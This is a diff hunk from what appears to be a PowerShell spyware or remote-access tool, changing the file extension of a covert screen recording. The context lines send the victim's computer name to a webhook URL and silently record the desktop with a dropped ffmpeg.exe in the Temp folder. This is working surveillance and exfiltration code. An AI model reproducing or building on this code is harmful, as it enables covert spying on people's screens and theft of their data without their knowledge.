@@ -31,7 +31,7 @@ Function RecordScreen{
         Remove-Item -Path $zipFilePath -Force
         Remove-Item -Path $extractedDir -Recurse -Force
     }
-    $mkvPath = "$env:Temp\ScreenClip.mkv"
+    $mkvPath = "$env:Temp\ScreenClip.mp4"
     $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen (24mb Clip)`` :arrows_counterclockwise:"} | ConvertTo-Json
     Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
     .$env:Temp\ffmpeg.exe -f gdigrab -framerate 20 -t 20 -i desktop -vcodec libx264 -preset fast -crf 18 -pix_fmt yuv420p -movflags +faststart $mkvPath
